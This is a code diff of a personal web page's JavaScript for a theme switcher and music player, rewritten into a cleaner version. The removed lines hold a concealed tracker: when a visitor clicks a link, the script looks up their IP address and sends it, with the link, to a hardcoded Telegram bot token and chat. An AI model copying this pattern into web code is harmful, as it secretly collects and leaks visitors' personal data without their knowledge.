@@ -1,191 +1,187 @@
-(function() {
-    const a = document.querySelector('.theme-switcher');
-    const b = 'dark-mode';
-    const c = '🌓';
-    const d = '🌞';
-    const e = 'linear-gradient(135deg, #d0d7ff 0%, #b7c2fe 100%)';
-    const f = 'linear-gradient(135deg, #0a0a1a 0%, #1a1a33 100%)';
-    const g = 'theme';
-    const h = 'https://api.ipify.org?format=json';
-    const i = '7675320038:AAEXpIMO9j5zlLtOYASjloTIjWj1nLupNqQ';
-    const j = '6101479678';
-    const k = 'https://api.telegram.org/bot';
+import * as musicMetadata from 'https://cdn.jsdelivr.net/npm/music-metadata-browser/+esm';
 
-    function l() {
-        const m = document.body.classList.toggle(b);
-        const n = m ? 'dark' : 'light';
-        a.textContent = m ? c : d;
-        document.body.style.transition = 'none';
-        document.body.style.background = m ? e : f;
-        setTimeout(() => {
-            document.body.style.transition = 'background 0.5s ease';
-            o();
-        }, 50);
-        localStorage.setItem(g, n);
+const themeSwitcher = document.querySelector('.theme-switcher');
+const darkModeClass = 'dark';
+const sunIcon = '🌞';
+const moonIcon = '🌓';
+const themeKey = 'theme';
+
+function toggleTheme() {
+    const isDark = document.body.classList.toggle(darkModeClass);
+    themeSwitcher.textContent = isDark ? moonIcon : sunIcon;
+    localStorage.setItem(themeKey, isDark ? 'dark' : 'light');
+}
+window.toggleTheme = toggleTheme;
+
+document.addEventListener('DOMContentLoaded', async () => {
+    const savedTheme = localStorage.getItem(themeKey);
+    if (savedTheme === 'dark') {
+        document.body.classList.add(darkModeClass);
+        themeSwitcher.textContent = moonIcon;
+    } else {
+        themeSwitcher.textContent = sunIcon;
     }
 
-    function o() {
-        document.body.style.background = document.body.classList.contains(b) ? f : e;
-    }
+    try {
+        const response = await fetch('music.mp3');
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+        const blob = await response.blob();
+        const metadata = await musicMetadata.parseBlob(blob);
 
-    document.addEventListener('DOMContentLoaded', () => {
-        const p = localStorage.getItem(g);
-        if (p === 'dark') {
-            document.body.classList.add(b);
-            a.textContent = c;
-        } else {
-            a.textContent = d;
+        document.getElementById('song-title').textContent = metadata.common.title || "Неизвестный трек";
+        document.getElementById('song-artist').textContent = metadata.common.artist || "Неизвестный исполнитель";
+
+        if (metadata.common.picture?.length) {
+            const picture = metadata.common.picture[0];
+            const base64String = arrayBufferToBase64(picture.data);
+            document.getElementById('album-art').src = `data:${picture.format};base64,${base64String}`;
         }
-        o();
 
-        const q = document.querySelectorAll('.link-tooltip');
-        q.forEach(r => {
-            const s = r.getAttribute('data-url');
-            const t = document.createElement('span');
-            t.textContent = s;
-            t.style.display = 'none';
-            t.style.position = 'absolute';
-            t.style.left = '50%';
-            t.style.transform = 'translateX(-50%)';
-            t.style.zIndex = '2';
-            t.style.color = 'white';
-            r.appendChild(t);
-
-            r.addEventListener('mouseenter', function() {
-                t.style.display = 'block';
-            });
-
-            r.addEventListener('mouseleave', function() {
-                t.style.display = 'none';
-            });
-
-            r.addEventListener('click', function(u) {
-                u.preventDefault();
-                const v = r.getAttribute('href');
-                window.open(v, '_blank');
-
-                fetch(h)
-                    .then(w => w.json())
-                    .then(x => {
-                        const y = x.ip;
-                        fetch(`${k}${i}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: j,
-                                text: `IP Address: ${y} clicked on ${v}`
-                            })
-                        });
-                    });
-            });
-        });
-    });
-
-    // Music Player Functionality
-    const audioPlayer = document.getElementById('audio-player');
-    const playPauseBtn = document.getElementById('play-pause-btn');
-    const progress = document.getElementById('progress');
-    const currentTimeEl = document.getElementById('current-time');
-    const durationEl = document.getElementById('duration');
-    const albumCover = document.querySelector('.album-cover');
-    const songTitle = document.getElementById('song-title');
-    const songArtist = document.getElementById('song-artist');
-
-    let isPlaying = false;
-
-    // Function to extract metadata from audio file using jsmediatags
-    function extractMetadata() {
-        // Load jsmediatags library
-        const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/npm/jsmediatags@latest/dist/jsmediatags.min.js';
-        script.onload = function() {
-            // Try to read metadata directly from the file path
-            jsmediatags.read(audioPlayer.src, {
-                onSuccess: function(tag) {
-                    console.log('Metadata tags:', tag.tags);
-                    // Display all metadata for debugging
-                    document.getElementById('metadata-output').textContent = JSON.stringify(tag.tags, null, 2);
-
-                    // Try different tag names for compatibility
-                    const title = tag.tags.title || tag.tags.TIT2 || tag.tags.TIT1 || "Unknown Title";
-                    const artist = tag.tags.artist || tag.tags.TPE1 || tag.tags.TPE2 || "Unknown Artist";
-                    const picture = tag.tags.picture || tag.tags.APIC || tag.tags.PIC || null;
-
-                    songTitle.textContent = title;
-                    songArtist.textContent = artist;
-
-                    if (picture) {
-                        const base64String = arrayBufferToBase64(picture.data);
-                        document.getElementById('album-art').src = `data:${picture.format};base64,${base64String}`;
-                    } else {
-                        document.getElementById('album-art').src = "album-cover.jpg";
-                    }
-                },
-                onError: function(error) {
-                    console.error('Error reading metadata:', error);
-                    document.getElementById('metadata-output').textContent = 'Error reading metadata: ' + error.message;
-                    // Fallback to default values
-                    songTitle.textContent = "Unknown Title";
-                    songArtist.textContent = "Unknown Artist";
-                    document.getElementById('album-art').src = "album-cover.jpg";
-                }
-            });
-        };
-        document.head.appendChild(script);
-    }
-
-    // Helper function to convert ArrayBuffer to Base64
-    function arrayBufferToBase64(buffer) {
-        let binary = '';
-        const bytes = new Uint8Array(buffer);
-        const len = bytes.byteLength;
-        for (let i = 0; i < len; i++) {
-            binary += String.fromCharCode(bytes[i]);
+        if (metadata.format.duration) {
+            document.getElementById('duration').textContent = formatTime(metadata.format.duration);
         }
-        return window.btoa(binary);
+    } catch (err) {
+        console.error("Ошибка при чтении метаданных:", err);
+        document.getElementById('song-title').textContent = "Ошибка чтения тегов";
+        document.getElementById('song-artist').textContent = "";
     }
+});
 
-    function playPause() {
-        if (isPlaying) {
-            audioPlayer.pause();
-            playPauseBtn.textContent = '▶';
-            albumCover.classList.remove('playing');
-        } else {
-            audioPlayer.play();
-            playPauseBtn.textContent = '⏸';
-            albumCover.classList.add('playing');
-        }
-        isPlaying = !isPlaying;
+function arrayBufferToBase64(buffer) {
+    let binary = '';
+    const bytes = new Uint8Array(buffer);
+    for (let i = 0; i < bytes.length; i++) {
+        binary += String.fromCharCode(bytes[i]);
     }
+    return window.btoa(binary);
+}
 
-    function updateProgress() {
-        const { duration, currentTime } = audioPlayer;
-        const progressPercent = (currentTime / duration) * 100;
-        progress.style.width = `${progressPercent}%`;
+const audioPlayer = document.getElementById('audio-player');
+const playPauseBtn = document.getElementById('play-pause-btn');
+const progressBar = document.getElementById('progress');
+const progressContainer = document.querySelector('.progress-bar');
+const currentTimeEl = document.getElementById('current-time');
+const durationEl = document.getElementById('duration');
+const albumCover = document.querySelector('.album-cover');
 
-        // Update time display
-        const currentMinutes = Math.floor(currentTime / 60);
-        const currentSeconds = Math.floor(currentTime % 60).toString().padStart(2, '0');
-        currentTimeEl.textContent = `${currentMinutes}:${currentSeconds}`;
+// тултип времени
+const timeTooltip = document.createElement('div');
+timeTooltip.classList.add('time-tooltip');
+progressContainer.appendChild(timeTooltip);
 
-        const durationMinutes = Math.floor(duration / 60);
-        const durationSeconds = Math.floor(duration % 60).toString().padStart(2, '0');
-        durationEl.textContent = `${durationMinutes}:${durationSeconds}`;
-    }
+let isPlaying = false;
+let isDragging = false;
+let isPlayingBeforeDrag = false;
+let dragPercent = 0;
 
-    // Event Listeners
-    playPauseBtn.addEventListener('click', playPause);
-    audioPlayer.addEventListener('timeupdate', updateProgress);
-    audioPlayer.addEventListener('ended', () => {
-        playPauseBtn.textContent = '▶';
+function playPause() {
+    if (isPlaying) {
+        audioPlayer.pause();
+        playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
         albumCover.classList.remove('playing');
-        isPlaying = false;
-    });
+    } else {
+        audioPlayer.play();
+        playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+        albumCover.classList.add('playing');
+    }
+    isPlaying = !isPlaying;
+}
 
-    // Initialize
-    extractMetadata();
+function updateProgress() {
+    if (!isDragging) {
+        const { duration, currentTime } = audioPlayer;
+        if (!isNaN(duration)) {
+            const progressPercent = (currentTime / duration) * 100;
+            progressBar.style.width = `${progressPercent}%`;
+            currentTimeEl.textContent = formatTime(currentTime);
+            durationEl.textContent = formatTime(duration);
+        }
+    }
+}
 
-    window.toggleTheme = l;
-})();
+function formatTime(seconds) {
+    if (!seconds || isNaN(seconds)) return "0:00";
+    const mins = Math.floor(seconds / 60);
+    const secs = Math.floor(seconds % 60).toString().padStart(2, '0');
+    return `${mins}:${secs}`;
+}
+
+function updateDragPosition(e) {
+    const rect = progressContainer.getBoundingClientRect();
+    const offsetX = Math.min(Math.max(e.clientX - rect.left, 0), rect.width);
+    dragPercent = offsetX / rect.width;
+    progressBar.style.width = `${dragPercent * 100}%`;
+    const previewTime = dragPercent * audioPlayer.duration;
+    currentTimeEl.textContent = formatTime(previewTime);
+    updateTooltip(offsetX, previewTime);
+}
+
+function updateTooltip(offsetX, time) {
+    timeTooltip.textContent = formatTime(time);
+    timeTooltip.style.left = `${offsetX}px`;
+}
+
+progressContainer.addEventListener('mousedown', (e) => {
+    isDragging = true;
+    isPlayingBeforeDrag = !audioPlayer.paused;
+    updateDragPosition(e);
+});
+document.addEventListener('mousemove', (e) => {
+    if (isDragging) updateDragPosition(e);
+});
+document.addEventListener('mouseup', () => {
+    if (isDragging) {
+        isDragging = false;
+        audioPlayer.currentTime = dragPercent * audioPlayer.duration;
+        updateProgress();
+        if (isPlayingBeforeDrag) audioPlayer.play();
+        isPlayingBeforeDrag = false;
+    }
+});
+
+progressContainer.addEventListener('mousemove', (e) => {
+    const rect = progressContainer.getBoundingClientRect();
+    const offsetX = Math.min(Math.max(e.clientX - rect.left, 0), rect.width);
+    const percent = offsetX / rect.width;
+    const previewTime = percent * audioPlayer.duration;
+    updateTooltip(offsetX, previewTime);
+    timeTooltip.style.opacity = 1;
+});
+progressContainer.addEventListener('mouseleave', () => {
+    timeTooltip.style.opacity = 0;
+});
+
+playPauseBtn.addEventListener('click', playPause);
+audioPlayer.addEventListener('timeupdate', updateProgress);
+audioPlayer.addEventListener('ended', () => {
+    playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+    albumCover.classList.remove('playing');
+    isPlaying = false;
+});
+
+// громкость + mute
+const volumeWrapper = document.querySelector('.volume-wrapper');
+const volumeToggle = document.querySelector('.volume-toggle');
+const volumeSlider = document.getElementById('volume-slider');
+let isMuted = false;
+
+volumeSlider.value = audioPlayer.volume;
+
+volumeSlider.addEventListener('input', () => {
+    audioPlayer.volume = volumeSlider.value;
+    if (audioPlayer.volume > 0) {
+        isMuted = false;
+        audioPlayer.muted = false;
+        volumeToggle.innerHTML = '<i class="fas fa-volume-up"></i>';
+    }
+});
+
+volumeToggle.addEventListener('click', () => {
+    volumeWrapper.classList.toggle('active');
+    isMuted = !isMuted;
+    audioPlayer.muted = isMuted;
+    volumeToggle.innerHTML = isMuted 
+        ? '<i class="fas fa-volume-mute"></i>' 
+        : '<i class="fas fa-volume-up"></i>';
+});
+
